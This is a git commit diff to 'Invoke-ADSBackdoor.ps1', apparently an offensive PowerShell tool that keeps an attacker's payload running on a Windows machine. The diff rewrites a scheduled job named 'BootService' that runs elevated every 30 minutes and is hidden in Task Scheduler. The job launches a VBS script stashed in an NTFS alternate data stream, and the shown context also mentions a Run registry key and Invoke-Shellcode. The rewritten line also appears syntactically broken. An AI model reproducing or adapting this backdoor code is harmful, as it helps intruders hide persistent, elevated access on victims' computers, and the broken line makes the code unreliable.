d95e40bfbb52ac0dd52b5a91bad53013795fe6fe
simonpunk <simonp230446@hotmail.com>
2016-07-09 14:30:07 +0800

    Update Invoke-ADSBackdoor.ps1

--- Invoke-ADSBackdoor.ps1
+++ Invoke-ADSBackdoor.ps1
@@ -93,10 +93,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\BootService"
     }
     else {
-       $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
-       $Trig = {New-JobTrigger -Once -At "07:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"}
-       $Script = {wscript.exe $env:USERPROFILE\AppData:$vbsFile}
-       Register-ScheduledJob –Name BootService -ScriptBlock $Script –Trigger $Trig –ScheduledJobOption $Option
+       Register-ScheduledJob –Name BootService -ScriptBlock {wscript.exe $env:USERPROFILE\AppData:$vbsFile} –Trigger New-JobTrigger -Once -At "07:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00" –ScheduledJobOption New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
        "Process Complete. Persistent key is located at "
     }
     #Persist in Registry
